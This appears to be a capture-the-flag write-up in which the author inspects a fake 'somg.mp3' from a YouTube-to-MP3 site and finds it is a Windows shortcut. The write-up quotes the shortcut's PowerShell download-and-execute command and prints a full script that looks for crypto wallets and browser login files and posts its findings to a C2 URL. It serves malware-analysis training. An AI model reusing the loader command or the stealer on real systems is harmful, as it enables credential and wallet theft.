We are asked to investigate a yt to mp3 website. 
+ Firstly we are asked to use the site and download our files. We get two outputs. One named `song.mp3` the other `somg.mp3`. We examine what type of file both of these are:
  ```
  root@ip-10-10-189-48:~# file song.mp3
  song.mp3: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
  ```
  ```
  root@ip-10-10-189-48:~# file somg.mp3
  somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, ctime=Sat Sep 15 07:14:14 2018, mtime=Sat Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide
  ```
  We can see that `somg.mp3` is not an mp3 but a `.lnk` file.
  
+ We look at further info about `somg.mp3` by using `exiftool`.
  ```
  root@ip-10-10-189-48:~# exiftool somg.mp3
  ExifTool Version Number         : 11.88
  File Name                       : somg.mp3
  Directory                       : .
  File Size                       : 2.1 kB
  File Modification Date/Time     : 2024:10:30 14:32:52+00:00
  File Access Date/Time           : 2024:12:03 13:08:04+00:00
  File Inode Change Date/Time     : 2024:12:03 12:58:39+00:00
  File Permissions                : rw-r--r--
  File Type                       : LNK
  File Type Extension             : lnk
  MIME Type                       : application/octet-stream
  Flags                           : IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata
  File Attributes                 : Archive
  Create Date                     : 2018:09:15 08:14:14+01:00
  Access Date                     : 2018:09:15 08:14:14+01:00
  Modify Date                     : 2018:09:15 08:14:14+01:00
  Target File Size                : 448000
  Icon Index                      : (none)
  Run Window                      : Normal
  Hot Key                         : (none)
  Target File DOS Name            : powershell.exe
  Drive Type                      : Fixed Disk
  Volume Label                    : 
  Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
  Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
  Machine ID                      : win-base-2019
  ```
  Here we can see in Command Line Arguments it has `-ep Bypass -nop -c` which I learned disables PowerShell's usual restrictions. `.DownloadFile` downloads a file from `https://raw.githubusercontent.com/MM-   WarevilleTHM/IS/refs/heads/main/IS.ps1` and saves it to `C:\ProgramData\s.ps1`. After it gets downloaded, the powershell script which is in the file that was downloaded gets executed using `iex`.

+ Looking at the powershell script by going to the website, we can see it extracts some very sensitive info like the user's crypto wallets. Which essentially means that once the user opens `somg.mp3` it downloads and runs the powershell script and steals the user's crypto wallets.

  ```
  function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
  }
  
  # Call the function to print the ASCII art
  Print-AsciiArt
  
  # Path for the info file
  $infoFilePath = "stolen_info.txt"
  
  # Function to search for wallet files
  function Search-ForWallets {
      $walletPaths = @(
          "$env:USERPROFILE\.bitcoin\wallet.dat",
          "$env:USERPROFILE\.ethereum\keystore\*",
          "$env:USERPROFILE\.monero\wallet",
          "$env:USERPROFILE\.dogecoin\wallet.dat"
      )
      Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
      foreach ($path in $walletPaths) {
          if (Test-Path $path) {
              Add-Content -Path $infoFilePath -Value "Found wallet: $path"
          }
      }
  }
  
  # Function to search for browser credential files (SQLite databases)
  function Search-ForBrowserCredentials {
      $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
      $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"
  
      Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
      if (Test-Path $chromePath) {
          Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
      }
      if (Test-Path $firefoxPath) {
          Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
      }
  }
  
  # Function to send the stolen info to a C2 server
  function Send-InfoToC2Server {
      $c2Url = "http://papash3ll.thm/data"
      $data = Get-Content -Path $infoFilePath -Raw
  
      # Using Invoke-WebRequest to send data to the C2 server
      Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
  }
  
  # Main execution flow
  Search-ForWallets
  Search-ForBrowserCredentials
  Send-InfoToC2Server
  ```
  We can see that the C2 server to which the code sends the stolen data to is `http://papash3ll.thm/data`.
+ Now we are asked to investigate further. We searched up the code on github, saw that a issue was raised by `M.M` i.e. `Mayor Malware` after that we look at the commit history of `CryptoWallet-Search` and thus we get all our answers.

### What I Learned
+ One must always be on the lookout for malicious sites. AS once the damage is done there is no going back.
+ If we do use such sites for any reason, we must investigate the files that we downloaded.

  
